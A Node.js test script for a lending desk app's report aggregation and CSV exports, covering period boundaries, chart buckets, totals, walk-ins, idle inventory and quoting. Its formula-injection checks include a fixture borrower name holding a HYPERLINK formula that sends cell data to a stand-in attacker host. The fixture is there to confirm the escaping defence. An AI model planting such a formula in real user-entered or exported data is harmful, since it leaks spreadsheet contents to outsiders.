// Exercises the report aggregation in web/js/app.js.
//
//   node tools/test-report.cjs
//
// The section under test is lifted out of the real source by marker, so this
// cannot drift from what ships. Everything in it is pure -- rows in, a plain
// object out -- so it runs here with no browser and no database, and with the
// clock pinned so a period boundary cannot make the suite flaky on a Monday.

const fs = require("fs");
const path = require("path");
const vm = require("vm");

const src = fs.readFileSync(path.join(__dirname, "..", "web", "js", "app.js"), "utf8");

const from = src.indexOf("const REPORT_PERIODS = [");
const to = src.indexOf("function _reportLoadPeriod() {");
if (from < 0 || to < 0 || to < from) {
  console.error("FAIL: could not find the report section in app.js");
  process.exit(1);
}
const section = src.slice(from, to);

// csvEscape lives outside that section, so it is lifted by its own marker rather
// than copied. It decides whether a spreadsheet reads an exported cell as text or
// as a formula, and a copy would let a fix ship in app.js while this suite went on
// checking the behaviour that was fixed.
const csvFrom = src.indexOf("function csvEscape(s) {");
const csvTo = src.indexOf("\n}\n", csvFrom);
if (csvFrom < 0 || csvTo < 0) {
  console.error("FAIL: could not find csvEscape in app.js");
  process.exit(1);
}
const csvEscapeSource = src.slice(csvFrom, csvTo + 2);

// The All Loans export, lifted the same way. It used to do its own quoting and
// skip csvEscape, so the formula guard above never reached the main export.
const loansCsvFrom = src.indexOf("function _loansToCsv(loans) {");
const loansCsvTo = src.indexOf("\n}\n", loansCsvFrom);
if (loansCsvFrom < 0 || loansCsvTo < 0) {
  console.error("FAIL: could not find _loansToCsv in app.js");
  process.exit(1);
}
const loansCsvSource = src.slice(loansCsvFrom, loansCsvTo + 2);

let failures = 0;
const check = (name, cond, detail) => {
  if (cond) return;
  failures++;
  console.error(`FAIL  ${name}${detail === undefined ? "" : "  -> " + detail}`);
};
const ok = (name) => console.log(`  ok  ${name}`);

const sandbox = {
  console,
  JSON,
  Math,
  Date,
  Number,
  String,
  Array,
  Object,
  Error,
  Map,
  Set,
  // Lifted verbatim from app.js: an open loan has isOpen === "open" AND no
  // returnedAt, so a loan that was returned but not re-written still counts.
  isLoanOpen: (loan) => !!loan && loan.isOpen === "open" && !loan.returnedAt,
  formatPhone: (p) => {
    const d = String(p || "").replace(/\D/g, "").slice(-10);
    return d.length === 10 ? `(${d.slice(0, 3)}) ${d.slice(3, 6)}-${d.slice(6)}` : String(p || "");
  }
};
sandbox.globalThis = sandbox;
vm.createContext(sandbox);
vm.runInContext(csvEscapeSource + "\nglobalThis.csvEscape = csvEscape;", sandbox);
vm.runInContext(loansCsvSource + "\nglobalThis._loansToCsv = _loansToCsv;", sandbox);
// `const` at the top level of a script is a lexical binding, not a property of
// the sandbox object, so the period table is lifted out explicitly.
vm.runInContext(section + "\nglobalThis.REPORT_PERIODS = REPORT_PERIODS;", sandbox);

const DAY = 864e5;
// A fixed "now": Friday 18 September 2026, mid-afternoon, local time.
const NOW = new Date(2026, 8, 18, 14, 30, 0, 0).getTime();
const at = (daysAgo, hour = 10) => {
  const d = new Date(NOW);
  return new Date(d.getFullYear(), d.getMonth(), d.getDate() - daysAgo, hour, 0, 0, 0).getTime();
};

const loan = (o) => ({
  id: o.id,
  itemId: o.itemId === undefined ? null : o.itemId,
  itemNameSnapshot: o.item || "",
  borrowerId: o.borrowerId === undefined ? null : o.borrowerId,
  borrowerNameSnapshot: o.name || "",
  borrowerPhoneSnapshot: o.phone === undefined ? "" : o.phone,
  checkedOutAt: o.out,
  dueAt: o.due === undefined ? null : o.due,
  returnedAt: o.ret === undefined ? null : o.ret,
  isOpen: o.ret ? "closed" : "open"
});

const item = (id, name, category, extra) => ({
  id,
  name,
  nameLower: name.toLowerCase(),
  category: category || "Other",
  ...(extra || {})
});

console.log("\nReport aggregation\n");

// --- Period boundaries ----------------------------------------------------
{
  const week = sandbox.reportSince("week", NOW);
  const weekDate = new Date(week);
  check(
    "the week starts on a Monday at local midnight",
    weekDate.getDay() === 1 && weekDate.getHours() === 0 && weekDate.getMinutes() === 0,
    weekDate.toString()
  );
  const expectedMonday = new Date(2026, 8, 18 - ((new Date(NOW).getDay() + 6) % 7)).getTime();
  check("and it is the Monday of the week now falls in", week === expectedMonday, `${week} vs ${expectedMonday}`);
  check("the week start is never in the future", week <= NOW, weekDate.toString());

  check("30 days back is 29 days before local midnight today", sandbox.reportSince("month", NOW) === at(29, 0), new Date(sandbox.reportSince("month", NOW)).toString());
  check("90 days back is 89 days before local midnight today", sandbox.reportSince("term", NOW) === at(89, 0), new Date(sandbox.reportSince("term", NOW)).toString());
  check("all time starts at the epoch, so no loan needs a special case", sandbox.reportSince("all", NOW) === 0);
  check("an unknown period falls through to all time rather than throwing", sandbox.reportSince("nonsense", NOW) === 0);
  ok("period starts are calendar-aligned local midnights");
}

// --- Buckets --------------------------------------------------------------
{
  // The chart runs from the period start through today, so a week in progress
  // is as many bars as calendar days have happened -- it cannot chart the future.
  const daysSoFar = (period) => sandbox.reportDaysBetween(sandbox.reportSince(period, NOW), at(0, 0)) + 1;
  const counts = (n) => sandbox.reportBuckets(sandbox.reportSince(n, NOW), NOW, false).length;
  check("this week charts one bar per day so far, not seven empty ones", counts("week") === daysSoFar("week"), counts("week"));
  check("30 days is thirty daily buckets", counts("month") === 30, counts("month"));
  check("90 days is ninety daily buckets", counts("term") === 90, counts("term"));
  check("the week's bars stop at today", counts("week") <= 7, counts("week"));

  const days = sandbox.reportBuckets(sandbox.reportSince("month", NOW), NOW, false);
  const consecutive = days.every((b, i) => new Date(b.start).getHours() === 0 && b.end === (days[i + 1] ? days[i + 1].start : b.end));
  check("buckets tile the period without gaps", consecutive);
  check("the last bucket ends after now", days[days.length - 1].end > NOW, new Date(days[days.length - 1].end).toString());
  check("every bucket starts at local midnight", days.every((b) => new Date(b.start).getHours() === 0));
  check("a bucket's end is the next bucket's start", days.every((b, i) => !days[i + 1] || b.end === days[i + 1].start));

  // Months, for "all time".
  const months = sandbox.reportBuckets(at(400, 0), NOW, true);
  check("an all-time chart is bucketed by month", months.length === 14 && months.every((b) => new Date(b.start).getDate() === 1), months.length);
  const long = sandbox.reportBuckets(new Date(2000, 0, 1).getTime(), NOW, true);
  check("and is capped so an old desk cannot produce an unreadable chart", long.length === 24, long.length);
  check("the cap keeps the most recent months, not the oldest", new Date(long[long.length - 1].start).getFullYear() === 2026, new Date(long[0].start).toString());
  ok("daily and monthly buckets are calendar-correct and capped");
}

// --- Totals ---------------------------------------------------------------
{
  const loans = [
    loan({ id: 1, itemId: 10, borrowerId: 100, out: at(1, 9), due: at(0, 17) }),
    loan({ id: 2, itemId: 11, borrowerId: 100, out: at(2, 9), due: at(1, 17), ret: at(1, 12) }),
    loan({ id: 3, itemId: 10, borrowerId: 101, out: at(3, 9), due: at(2, 17), ret: at(2, 12) }),
    loan({ id: 4, itemId: 12, borrowerId: 102, out: at(4, 9), due: at(3, 9), ret: at(2, 9) })
  ];
  const items = [item(10, "HDMI dongle"), item(11, "Clicker"), item(12, "Room key")];
  const borrowers = [
    { id: 100, name: "Ada", phone: "4165550100" },
    { id: 101, name: "Grace", phone: "4165550101" },
    { id: 102, name: "Alan", phone: "4165550102" }
  ];
  const r = sandbox.buildReport({ loans, items, borrowers, period: "month", now: NOW });

  check("every loan in the period is counted", r.totals.loans === 4, r.totals.loans);
  check("people counts distinct borrowers, not loans", r.totals.people === 3, r.totals.people);
  check("two loans by one person is still one person", r.topBorrowers.find((p) => p.name === "Ada").count === 2);
  check("still out counts only open loans", r.totals.open === 1, r.totals.open);
  check("nothing is overdue here", r.totals.overdue === 0, r.totals.overdue);
  check("returned counts the closed ones", r.totals.returned === 3, r.totals.returned);
  check("items used counts distinct items", r.totals.items === 3, r.totals.items);

  // Loan 2: 27h. Loan 3: 27h. Loan 4: 48h. Mean = 34h.
  check("average loan length uses only what came back", Math.round(r.totals.avgLoanMs / 36e5) === 34, r.totals.avgLoanMs / 36e5);
  check("on-time counts returns at or before the due time", r.totals.onTime === 2, r.totals.onTime);
  check("and is reported as a percentage of returns", r.totals.onTimePct === 67, r.totals.onTimePct);
  ok("totals separate what is out from what came back");

  // The busiest item is the dongle, out twice.
  check("the busiest item tops the ranking", r.topItems[0].name === "HDMI dongle" && r.topItems[0].count === 2, JSON.stringify(r.topItems[0]));
  check("items are ranked by count", r.topItems.map((i) => i.count).join(",") === "2,1,1", r.topItems.map((i) => i.count).join(","));
  check("an item still out is flagged on its row", r.topItems[0].open === 1, r.topItems[0].open);
  check("Ada tops the people ranking", r.topBorrowers[0].name === "Ada" && r.topBorrowers[0].count === 2);
  ok("rankings order by use and carry the live name");
}

// --- An empty period is not an error -------------------------------------
{
  const r = sandbox.buildReport({ loans: [], items: [item(1, "Spare")], borrowers: [], period: "week", now: NOW });
  check("no loans means zero loans", r.totals.loans === 0);
  check("a period with nothing in it has no average", r.totals.avgLoanMs === null);
  check("and no on-time percentage", r.totals.onTimePct === null);
  check("nothing is ranked", r.topItems.length === 0 && r.topBorrowers.length === 0);
  check("but the whole catalog is idle", r.idle.length === 1, r.idle.length);
  const emptyWeekDays = sandbox.reportDaysBetween(sandbox.reportSince("week", NOW), at(0, 0)) + 1;
  check("the week chart still has its empty buckets", r.buckets.length === emptyWeekDays && r.buckets.every((b) => b.count === 0), r.buckets.length);
  check("and there is no busiest day to name", r.busiest === null);
  ok("an empty period reports zeroes rather than throwing");

  const all = sandbox.buildReport({ loans: [], items: [], borrowers: [], period: "all", now: NOW });
  check("all time with no history does not chart from 1970", all.buckets.length > 0 && all.buckets.length <= 2, all.buckets.length);
  ok("all time with no history falls back to a short recent window");
}

// --- Period filtering -----------------------------------------------------
{
  const loans = [
    loan({ id: 1, itemId: 10, borrowerId: 100, out: at(0, 9) }),
    loan({ id: 2, itemId: 10, borrowerId: 101, out: at(10, 9), ret: at(9, 9) }),
    loan({ id: 3, itemId: 10, borrowerId: 102, out: at(60, 9), ret: at(59, 9) }),
    loan({ id: 4, itemId: 10, borrowerId: 103, out: at(400, 9), ret: at(399, 9) }),
    // Older than the chart's 24-month window, but still a loan the desk made.
    loan({ id: 5, itemId: 10, borrowerId: 104, out: at(900, 9), ret: at(899, 9) })
  ];
  const items = [item(10, "Dongle")];
  const borrowers = [];
  const build = (p) => sandbox.buildReport({ loans, items, borrowers, period: p, now: NOW });

  check("this week sees only today's loan", build("week").totals.loans === 1, build("week").totals.loans);
  check("30 days sees today's and the ten-day-old one", build("month").totals.loans === 2, build("month").totals.loans);
  check("90 days also sees the sixty-day-old one", build("term").totals.loans === 3, build("term").totals.loans);
  check("all time sees everything", build("all").totals.loans === 5, build("all").totals.loans);
  const chartSum = build("all").buckets.reduce((s, b) => s + b.count, 0);
  check("a loan older than the chart window is still in the totals", chartSum === 4 && build("all").totals.loans === 5, `chart ${chartSum} of ${build("all").totals.loans}`);
  const ranked = build("all").topBorrowers;
  check("and its borrower still ranks, so nothing is silently dropped", ranked.length === 5 && ranked.some((p) => p.id === 104), JSON.stringify(ranked.map((p) => p.id)));
  ok("each period admits exactly the loans it should");
}

// --- Walk-ins do not become one imaginary person --------------------------
{
  const loans = [
    loan({ id: 1, itemId: 10, borrowerId: 100, out: at(1), ret: at(0) }),
    // Two anonymous walk-ins: same literal snapshot, no shared identity.
    loan({ id: 2, itemId: 10, out: at(1), ret: at(0), phone: "walk-in", name: "(walk-in)" }),
    loan({ id: 3, itemId: 10, out: at(2), ret: at(1), phone: "walk-in", name: "(walk-in)" }),
    // A walk-in who gave a number is a real, countable person.
    loan({ id: 4, itemId: 11, out: at(2), ret: at(1), phone: "4165550199", name: "Sam" }),
    loan({ id: 5, itemId: 11, out: at(3), ret: at(2), phone: "4165550199", name: "Sam" })
  ];
  const r = sandbox.buildReport({
    loans,
    items: [item(10, "Dongle"), item(11, "Clicker")],
    borrowers: [{ id: 100, name: "Ada", phone: "4165550100" }],
    period: "month",
    now: NOW
  });
  check("walk-ins are counted as loans", r.totals.loans === 5, r.totals.loans);
  check("but a walk-in is not counted as a person", r.totals.people === 2, r.totals.people);
  check("walk-ins are reported separately instead of being hidden", r.totals.walkIns === 2, r.totals.walkIns);
  check("no '(walk-in)' row appears in the people ranking", !r.topBorrowers.some((p) => /walk-in/.test(p.name)), JSON.stringify(r.topBorrowers.map((p) => p.name)));
  check("a walk-in who gave a number is counted once, not twice", r.topBorrowers.find((p) => p.name === "Sam").count === 2, JSON.stringify(r.topBorrowers.find((p) => p.name === "Sam")));
  ok("anonymous walk-ins stay anonymous without inflating the people count");
}

// --- Names come from the live catalog -------------------------------------
{
  const loans = [loan({ id: 1, itemId: 10, item: "HDMI dongle (old name)", borrowerId: 100, name: "Ada Lovelace", out: at(1) })];
  const r = sandbox.buildReport({
    loans,
    items: [item(10, "HDMI dongle")],
    borrowers: [{ id: 100, name: "Ada L.", phone: "4165550100" }],
    period: "month",
    now: NOW
  });
  check("a renamed item is reported under its current name", r.topItems[0].name === "HDMI dongle", r.topItems[0].name);
  check("a renamed borrower is too", r.topBorrowers[0].name === "Ada L.", r.topBorrowers[0].name);
  check("grouping is by id, so the rename did not split the row", r.topItems.length === 1 && r.topBorrowers.length === 1);
  ok("live names win over the snapshot taken at checkout");
}

// --- Deleting an item does not lose its history ---------------------------
{
  const loans = [loan({ id: 1, itemId: 99, item: "Retired clicker", borrowerId: 100, out: at(1) })];
  const r = sandbox.buildReport({ loans, items: [], borrowers: [], period: "month", now: NOW });
  check("a loan whose item is gone still ranks, under its snapshot name", r.topItems[0].name === "Retired clicker", JSON.stringify(r.topItems));
  ok("history survives the catalog row being deleted");
}

// --- Idle inventory -------------------------------------------------------
{
  const loans = [
    loan({ id: 1, itemId: 10, out: at(1) }),
    // Written before item 11 was renamed from "Old clicker".
    loan({ id: 2, itemId: 11, item: "Old clicker", out: at(2) })
  ];
  const items = [item(10, "Dongle"), item(11, "Clicker"), item(12, "Spare key"), item(13, "Marker", "Other", { isArchived: true })];
  const r = sandbox.buildReport({ loans, items, borrowers: [], period: "month", now: NOW });
  const idle = r.idle.map((i) => i.name);
  check("used items are not idle", !idle.includes("Dongle") && !idle.includes("Clicker"), JSON.stringify(idle));
  check("an item matched only by its pre-rename name is not idle either", !idle.includes("Clicker"), JSON.stringify(idle));
  check("never-used items are listed", idle.includes("Spare key"), JSON.stringify(idle));
  check("archived items are included, since the shelf still holds them", idle.includes("Marker"), JSON.stringify(idle));
  check("idle is alphabetical", idle.join(",") === "Marker,Spare key", idle.join(","));
  check("the catalog size is reported alongside", r.catalogSize === 4, r.catalogSize);
  ok("idle inventory is what the period did not touch");

  const all = sandbox.buildReport({ loans: [], items, borrowers: [], period: "all", now: NOW });
  check("over all time, everything unused is idle", all.idle.length === 4, all.idle.length);
  ok("all time with no loans marks the whole catalog idle");
}

// --- Busiest day ----------------------------------------------------------
{
  const loans = [
    loan({ id: 1, itemId: 10, out: at(2, 9) }),
    loan({ id: 2, itemId: 10, out: at(2, 11) }),
    loan({ id: 3, itemId: 10, out: at(2, 15) }),
    loan({ id: 4, itemId: 10, out: at(1, 9) })
  ];
  const r = sandbox.buildReport({ loans, items: [item(10, "Dongle")], borrowers: [], period: "week", now: NOW });
  check("three loans on one day is the busiest day", r.busiest && r.busiest.count === 3, JSON.stringify(r.busiest));
  check("four loans all fall inside this week", r.totals.loans === 4, r.totals.loans);
  check("and the busiest day is the one they were made on", r.buckets.filter((b) => b.count === 3).length === 1);
  check("bucket counts sum to the loans in the period", r.buckets.reduce((s, b) => s + b.count, 0) === r.totals.loans, r.buckets.reduce((s, b) => s + b.count, 0));
  ok("the chart's shape matches the loans behind it");

  const empty = sandbox.buildReport({ loans: [], items: [], borrowers: [], period: "week", now: NOW });
  check("a day with nothing on it is not named busiest", empty.busiest === null, JSON.stringify(empty.busiest));
  ok("an empty chart names no busiest day");
}

// --- A loan made "now" is inside the period -------------------------------
{
  const loans = [loan({ id: 1, itemId: 10, out: NOW })];
  const r = sandbox.buildReport({ loans, items: [item(10, "Dongle")], borrowers: [], period: "week", now: NOW });
  check("a loan checked out this instant is counted, not excluded by the boundary", r.totals.loans === 1, r.totals.loans);
  const onStart = [loan({ id: 2, itemId: 10, out: sandbox.reportSince("week", NOW) })];
  const r2 = sandbox.buildReport({ loans: onStart, items: [item(10, "Dongle")], borrowers: [], period: "week", now: NOW });
  check("and so is one made exactly at the period start", r2.totals.loans === 1, r2.totals.loans);
  ok("the period is inclusive at both ends");
}

// --- CSV ------------------------------------------------------------------
{
  const loans = [
    loan({ id: 1, itemId: 10, borrowerId: 100, out: at(2, 9), due: at(1, 17), ret: at(1, 12) }),
    loan({ id: 2, itemId: 11, borrowerId: 101, out: at(1, 9), due: at(0, 17) }),
    loan({ id: 3, itemId: 12, out: at(3, 9), ret: at(2, 9), phone: "walk-in", name: "(walk-in)" }),
    // Outside the period on purpose.
    loan({ id: 4, itemId: 10, borrowerId: 100, out: at(500), ret: at(499) })
  ];
  const items = [item(10, "Dongle", "Tech"), item(11, "Clicker, wireless", "Tech"), item(12, "Room key")];
  const borrowers = [
    { id: 100, name: "Ada", phone: "4165550100" },
    { id: 101, name: "Grace", phone: "4165550101" }
  ];
  const csv = sandbox.reportToCsv({ loans, items, borrowers, period: "month", now: NOW });
  const lines = csv.replace(/^﻿/, "").split("\n");

  check("the CSV starts with a BOM so Excel reads it as UTF-8", csv.charCodeAt(0) === 0xfeff);
  check("it has one header row", lines[0] === "borrower,phone,item,category,checked_out,due,returned,status,days_out", lines[0]);
  check("and one row per loan in the period, excluding the one outside it", lines.length === 4, lines.length);
  check("rows are oldest first", /walk-in/.test(lines[1]) && /Ada/.test(lines[2]) && /Grace/.test(lines[3]), lines.slice(1).join(" | "));
  check("a returned loan is marked returned", /,returned,/.test(lines[2]), lines[2]);
  check("an open one is marked out", /,out,/.test(lines[3]), lines[3]);
  check("an item name containing a comma is quoted", /"Clicker, wireless"/.test(csv), lines[3]);
  check("timestamps are unambiguous ISO instants, not locale text", /\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}/.test(lines[2]), lines[2]);
  check("a walk-in with no borrower row still exports", /walk-in/.test(lines[1]), lines[1]);
  check("the phone is formatted for a human reading the sheet", /\(416\) 555-0100/.test(lines[2]), lines[2]);
  check("an open loan reports days out against today", /,out,\d+$/.test(lines[3]), lines[3]);

  // The CSV must be quoted correctly: a name with a quote in it.
  const q = sandbox.reportToCsv({
    loans: [loan({ id: 9, itemId: 10, item: 'The "good" dongle', out: at(1) })],
    items: [],
    borrowers: [],
    period: "week",
    now: NOW
  });
  check("a quote inside a value is doubled, not left to break the file", /"The ""good"" dongle"/.test(q), q.split("\n")[1]);

  // A cell a spreadsheet would treat as a formula rather than as text. The name
  // can come from a borrower: the kiosk lets anyone name an item they are taking.
  const formula = sandbox.reportToCsv({
    loans: [loan({ id: 10, itemId: 20, item: "=1+1", out: at(1) })],
    items: [],
    borrowers: [],
    period: "week",
    now: NOW
  });
  check("a cell starting with = is neutralised, not left to be evaluated on open",
    /,'=1\+1,/.test(formula), formula.split("\n")[1]);

  const each = sandbox.reportToCsv({
    loans: [
      loan({ id: 11, itemId: 21, item: "+1", out: at(1, 9) }),
      loan({ id: 12, itemId: 22, item: "-1", out: at(1, 10) }),
      loan({ id: 13, itemId: 23, item: "@SUM(A1)", out: at(1, 11) })
    ],
    items: [],
    borrowers: [],
    period: "week",
    now: NOW
  });
  check("and so is one starting with +", /,'\+1,/.test(each), each.split("\n").find((l) => l.includes("+1")));
  check("and one starting with -", /,'-1,/.test(each), each.split("\n").find((l) => l.includes("-1")));
  check("and one starting with @", /,'@SUM\(A1\),/.test(each), each.split("\n").find((l) => l.includes("@SUM")));

  const plain = sandbox.reportToCsv({
    loans: [loan({ id: 14, itemId: 24, item: "Dongle", out: at(1) })],
    items: [],
    borrowers: [],
    period: "week",
    now: NOW
  });
  check("an ordinary name is not given an apostrophe it does not need",
    !/'/.test(plain) && /,Dongle,/.test(plain), plain.split("\n")[1]);

  // A period with nothing in it: the same loans, read a season later.
  const none = sandbox.reportToCsv({ loans, items, borrowers, period: "week", now: NOW + 60 * DAY });
  check("a period with no loans exports just the header", none.replace(/^﻿/, "").split("\n").length === 1, none.split("\n").length);
  ok("the CSV is well-formed and scoped to the period");
}

// --- The All Loans export guards formulas too -----------------------------
{
  const csv = sandbox._loansToCsv([
    {
      id: 7,
      itemNameSnapshot: "=1+2 Cable",
      borrowerNameSnapshot: '=HYPERLINK("http://evil.example/?"&A2,"Open")',
      borrowerPhoneSnapshot: "4165550100",
      checkedOutAt: NOW,
      conditionOut: "good",
      notes: 'said "thanks"'
    }
  ]).replace(/^\uFEFF/, "");
  const row = csv.split("\n")[1];
  check("a kiosk-typed item name is not exported as a formula", row.includes(",'=1+2 Cable,"), row);
  check("nor is a kiosk-typed borrower name", row.includes(`"'=HYPERLINK(`), row);
  check("a quote in the notes is escaped once, not twice", row.endsWith(`"said ""thanks"""`), row);
  ok("All Loans CSV goes through csvEscape like the other exports");
}

// --- The period key is bounded to a known set -----------------------------
{
  check("every period has a key and a label", sandbox.REPORT_PERIODS.every((p) => p.key && p.label));
  check("there are four of them", sandbox.REPORT_PERIODS.length === 4, sandbox.REPORT_PERIODS.length);
  check("the labels are distinct", new Set(sandbox.REPORT_PERIODS.map((p) => p.label)).size === 4);
  check("an unknown key still gets a label rather than undefined", sandbox.reportPeriodLabel("nope") === "Last 30 days", sandbox.reportPeriodLabel("nope"));
  ok("period keys are a closed set with readable fallbacks");
}

console.log("");
if (failures) {
  console.error(`${failures} check(s) failed.\n`);
  process.exit(1);
}
console.log("all checks passed\n");
